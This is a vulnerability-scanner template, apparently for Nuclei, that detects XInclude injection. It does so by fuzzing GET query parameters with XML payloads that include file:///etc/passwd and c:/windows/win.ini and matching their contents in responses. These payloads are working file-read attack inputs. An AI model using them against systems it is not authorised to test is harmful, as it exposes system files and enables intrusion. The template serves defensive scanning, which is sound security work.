http:
- fuzzing:
  - fuzz:
    - '{{xinc_fuzz}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - name: linux
    part: body
    regex:
    - 'root:.*?:[0-9]*:[0-9]*:'
    type: regex
  - name: windows
    part: body
    type: word
    words:
    - for 16-bit app support
  matchers-condition: or
  payloads:
    xinc_fuzz:
    - <asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>
    - <asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></asd>
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: xinclude-injection
info:
  author: DhiyaneshDK,ritikchaddha
  description: 'XInclude is a part of the XML specification that allows an XML document
    to be built from sub-documents. You can place an XInclude attack within any data
    value in an XML document, so the attack can be performed in situations where you
    only control a single item of data that is placed into a server-side XML document.

    '
  name: XInclude Injection - Detection
  reference:
  - https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks
  severity: high
  tags: dast,xxe,xinclude,vuln
